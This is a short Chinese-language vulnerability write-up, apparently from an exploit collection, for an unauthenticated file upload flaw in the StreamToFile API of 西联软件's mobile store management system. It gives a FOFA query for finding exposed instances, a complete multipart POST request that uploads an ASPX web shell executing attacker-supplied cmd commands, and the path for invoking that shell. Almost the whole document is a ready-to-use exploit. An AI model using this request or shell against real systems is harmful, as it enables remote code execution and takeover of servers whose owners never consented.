# 西联软件移动门店管理系统treamToFile文件上传漏洞

西联软件-移动门店管理系统 StreamToFile 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```javascript
body="西联软件提供云计算服务"
```

## poc
```javascript
POST /api/UploadDB/StreamToFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: */*
Connection: close

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="organ"

qwert
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="devid"

yuiop
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="files";filename="1.aspx"
Content-Type: image/png

<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

![image-20241227221622454](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272216534.png)

文件路径

```
/Files/DB/qwert_yuiop.aspx?cmd=dir
```

